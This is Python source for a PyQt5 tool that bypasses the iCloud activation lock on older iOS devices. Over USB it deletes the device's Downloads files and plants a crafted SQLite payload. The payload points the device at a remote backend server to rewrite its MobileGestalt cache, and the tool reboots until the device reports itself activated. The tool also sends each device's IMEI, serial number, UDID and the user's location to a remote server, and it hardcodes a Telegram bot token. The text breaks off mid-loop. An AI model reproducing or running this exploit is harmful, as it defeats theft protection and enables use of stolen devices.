import sys
import os
import time
import sqlite3
import tempfile
import json
import ssl
import certifi
import urllib.request
import urllib.parse
import threading
import platform

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget,
    QVBoxLayout, QHBoxLayout, QPushButton,
    QLabel, QMessageBox, QDialog, QProgressBar,
    QFrame, QGridLayout
)
from PyQt5.QtCore import QThread, pyqtSignal, QTimer, Qt, QPropertyAnimation, QEasingCurve
from PyQt5.QtGui import QPixmap, QIcon, QPainter, QColor, QFont, QPainterPath, QLinearGradient, QBrush, QPalette

from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.afc import AfcService
from pymobiledevice3.services.diagnostics import DiagnosticsService

# ========================== CONSTANTS ==========================
BACKEND_URL        = 'http://api.mobidocserver.com/iHPro_Tool_A5/A5/server.php'
VALIDATE_URL       = 'https://api.mobidocserver.com/iHPro_Tool_A5/A5/validate.php'
TELEGRAM_URL       = 'https://api.mobidocserver.com/iHPro_Tool_A5/A5/telegramreport.php'
TELEGRAM_BOT_TOKEN = '8878915882:AAHcLQFjNsEmhO8gOQ6cT4ioC9S9iualdVs'
TELEGRAM_CHAT_ID   = '1913084477'

OS_NAME = 'Windows' if sys.platform == 'win32' else ('macOS' if sys.platform == 'darwin' else 'Linux')

SUPPORTED = {
    'iPhone4,1': {'9.3.5', '9.3.6'},
    'iPad2,1':   {'8.4.1', '9.3.5'},
    'iPad2,2':   {'9.3.5', '9.3.6'},
    'iPad2,3':   {'9.3.5', '9.3.6'},
    'iPad2,4':   {'8.4.1', '9.3.5'},
    'iPad2,5':   {'8.4.1', '9.3.5'},
    'iPad2,6':   {'9.3.5', '9.3.6'},
    'iPad2,7':   {'9.3.5', '9.3.6'},
    'iPad3,1':   {'8.4.1', '9.3.5'},
    'iPad3,2':   {'9.3.5', '9.3.6'},
    'iPad3,3':   {'9.3.5', '9.3.6'},
    'iPod5,1':   {'8.4.1', '9.3.5'},
    'iPhone5,1': {'10.3.3', '10.3.4'},
    'iPhone5,2': {'10.3.3', '10.3.4'},
    'iPhone5,3': {'10.3.3', '10.3.4'},
    'iPhone5,4': {'10.3.3', '10.3.4'},
    'iPhone6,1': {'12.5.7', '12.5.8'},
    'iPad3,4':   {'10.3.3', '10.3.4'},
    'iPad3,5':   {'10.3.3', '10.3.4'},
    'iPad3,6':   {'10.3.3', '10.3.4'},
}

# ========================== UTILITY FUNCTIONS ==========================
def resource_path(name):
    base = getattr(sys, '_MEIPASS', os.path.abspath('.'))
    return os.path.join(base, name)

def mask(value: str, visible: int = 4) -> str:
    if not value or len(value) <= visible:
        return value
    return value[:visible] + '****'

def send_telegram_report(device_info: dict, status: str):
    try:
        product = device_info.get('product', 'N/A')
        version = device_info.get('version', 'N/A')
        udid    = device_info.get('udid',    'N/A')
        imei    = device_info.get('imei',    'N/A')
        sn      = device_info.get('sn',      'N/A')

        ctx = ssl.create_default_context(cafile=certifi.where())

        try:
            geo_req = urllib.request.urlopen('http://ip-api.com/json/', timeout=5)
            geo     = json.loads(geo_req.read().decode())
            country = geo.get('country', 'Unknown')
            city    = geo.get('city', '')
            location = f'{city}, {country}' if city else country
        except Exception:
            location = 'Unknown'

        data = urllib.parse.urlencode({
            'status':   status,
            'product':  product,
            'sn':       sn,
            'imei':     imei,
            'version':  version,
            'udid':     udid,
            'os':       OS_NAME,
            'location': location,
        }).encode()

        urllib.request.urlopen(
            urllib.request.Request(TELEGRAM_URL, data=data, method='POST'),
            timeout=10,
            context=ctx
        )
    except Exception:
        pass

def report_async(device_info: dict, status: str):
    threading.Thread(
        target=send_telegram_report,
        args=(device_info, status),
        daemon=True
    ).start()

def build_db_from_sql(sql_path, backend_url, target_path):
    with open(sql_path, 'r', encoding='utf-8') as f:
        sql = f.read()
    sql = sql.replace('BACKEND_URL', backend_url).replace('TARGET_PATH', target_path)
    tmp = tempfile.NamedTemporaryFile(delete=False)
    tmp.close()
    try:
        con = sqlite3.connect(tmp.name)
        con.executescript(sql)
        con.commit()
        con.close()
        with open(tmp.name, 'rb') as f:
            return f.read()
    finally:
        os.unlink(tmp.name)

def check_sn_registered(sn):
    try:
        ctx = ssl.create_default_context(cafile=certifi.where())
        url = f'{VALIDATE_URL}?sn={sn}'
        req = urllib.request.urlopen(url, timeout=10, context=ctx)
        data = json.loads(req.read().decode())
        return data.get('valid', False)
    except Exception:
        return False

# ========================== CLICKABLE LABEL ==========================
class ClickableLabel(QLabel):
    clicked = pyqtSignal()

    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton:
            self.clicked.emit()
        super().mousePressEvent(event)

# ========================== SUCCESS DIALOG ==========================
class SuccessDialog(QDialog):
    def __init__(self, parent=None, device_info=None):
        super().__init__(parent)
        self.device_info = device_info or {}
        self.setWindowTitle('Dhmf Software')
        self.setFixedSize(450, 200)
        self.setStyleSheet("""
            QDialog {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 #1a1a2e, stop:1 #16213e);
                border-radius: 15px;
                border: 2px solid #00d4ff;
            }
            QLabel {
                color: #ffffff;
                border: none;
                background: transparent;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #00d4ff, stop:1 #0090ff);
                color: white;
                border: none;
                border-radius: 8px;
                padding: 8px 20px;
                font-weight: bold;
                font-size: 12px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #00e5ff, stop:1 #00a0ff);
            }
            QPushButton:pressed {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #0090ff, stop:1 #0060ff);
            }
        """)

        layout = QVBoxLayout(self)
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(15)

        # Header with icon
        header = QHBoxLayout()
        icon_lbl = QLabel()
        icon_lbl.setFixedSize(60, 60)
        icon_lbl.setStyleSheet('border: none; background: transparent;')
        logo_path = resource_path('logo.png')
        if os.path.exists(logo_path):
            pix = QPixmap(logo_path).scaled(60, 60, Qt.KeepAspectRatio, Qt.SmoothTransformation)
            icon_lbl.setPixmap(pix)
        else:
            pix = QPixmap(60, 60)
            pix.fill(Qt.transparent)
            p = QPainter(pix)
            p.setRenderHint(QPainter.Antialiasing)
            p.setPen(Qt.NoPen)
            p.setBrush(QBrush(QColor('#00d4ff')))
            p.drawRoundedRect(0, 0, 60, 60, 15, 15)
            p.setPen(QColor('white'))
            p.setFont(QFont('Arial', 20, QFont.Bold))
            p.drawText(pix.rect(), Qt.AlignCenter, 'D')
            p.end()
            icon_lbl.setPixmap(pix)
        header.addWidget(icon_lbl)
        header.addSpacing(10)
        
        title = QLabel('DHMF SOFTWARE')
        title.setStyleSheet('font-size: 18px; font-weight: bold; color: #00d4ff;')
        header.addWidget(title)
        header.addStretch()
        layout.addLayout(header)

        product = self.device_info.get('product', '')
        version = self.device_info.get('version', '')

        msg = QLabel(f'✅ Device {product} iOS {version}\nActivated Successfully!')
        msg.setStyleSheet('font-size: 14px; color: #ffffff; text-align: center;')
        msg.setAlignment(Qt.AlignCenter)
        layout.addWidget(msg)

        sub_msg = QLabel('Bypass completed successfully! 🎉')
        sub_msg.setStyleSheet('font-size: 12px; color: #88ccff; text-align: center;')
        sub_msg.setAlignment(Qt.AlignCenter)
        layout.addWidget(sub_msg)

        ok_btn = QPushButton('OK')
        ok_btn.setFixedWidth(100)
        ok_btn.clicked.connect(self.accept)
        
        btn_layout = QHBoxLayout()
        btn_layout.addStretch()
        btn_layout.addWidget(ok_btn)
        layout.addLayout(btn_layout)

# ========================== ACTIVATION THREAD ==========================
class ActivationThread(QThread):
    status  = pyqtSignal(str)
    success = pyqtSignal(str)
    error   = pyqtSignal(str)
    waiting = pyqtSignal(bool)
    progress = pyqtSignal(int)

    def __init__(self, device_info=None):
        super().__init__()
        self._device_info = device_info or {}

    def wait_for_device(self, timeout=160):
        deadline = time.monotonic() + timeout
        first    = True
        while time.monotonic() < deadline:
            try:
                lockdown = create_using_usbmux()
                DiagnosticsService(lockdown=lockdown).mobilegestalt(keys=['ProductType'])
                if not first:
                    self.waiting.emit(False)
                    self.status.emit('Device reconnected ✓')
                return lockdown
            except Exception:
                if first:
                    self.waiting.emit(True)
                    self.status.emit('Waiting for device reconnection...')
                    first = False
                time.sleep(2)
        raise TimeoutError()

    def push_payload(self, lockdown, payload_db):
        with AfcService(lockdown=lockdown) as afc:
            try:
                for filename in afc.listdir('Downloads'):
                    try:
                        afc.rm('Downloads/' + filename)
                    except Exception:
                        pass
            except Exception:
                pass
            time.sleep(3)
            afc.set_file_contents('Downloads/downloads.28.sqlitedb', payload_db)
        DiagnosticsService(lockdown=lockdown).restart()
        return self.wait_for_device()

    def should_hactivate(self, lockdown):
        return DiagnosticsService(lockdown=lockdown).mobilegestalt(
            keys=['ShouldHactivate']
        ).get('ShouldHactivate')

    def run(self):
        try:
            self.progress.emit(10)
            lockdown = create_using_usbmux()
            values   = lockdown.get_value()

            if values.get('ActivationState') == 'Activated':
                self.success.emit('Device is already activated')
                return

            self.progress.emit(20)
            sql_path = resource_path('payload.sql')
            if tuple(int(x) for x in values.get('ProductVersion').split('.')) >= (10, 3):
                payload_db = build_db_from_sql(
                    sql_path, BACKEND_URL,
                    '/private/var/containers/Shared/SystemGroup/'
                    'systemgroup.com.apple.mobilegestaltcache/Library/Caches/'
                    'com.apple.MobileGestalt.plist'
                )
            else:
                payload_db = build_db_from_sql(
                    sql_path, BACKEND_URL,
                    '/private/var/mobile/Library/Caches/com.apple.MobileGestalt.plist'
                )

            self.status.emit('Activating device...')
            self.progress.emit(30)

            for attempt in range(5):
                self.progress.emit(30 + attempt * 12)
                lockdown = self.push_payload(lockdown, payload_db)
                delay = 15 + attempt * 5
                time.sleep(delay)

                if self.should_hactivate(lockdown):
                    DiagnosticsService(lockdown=lockdown).restart
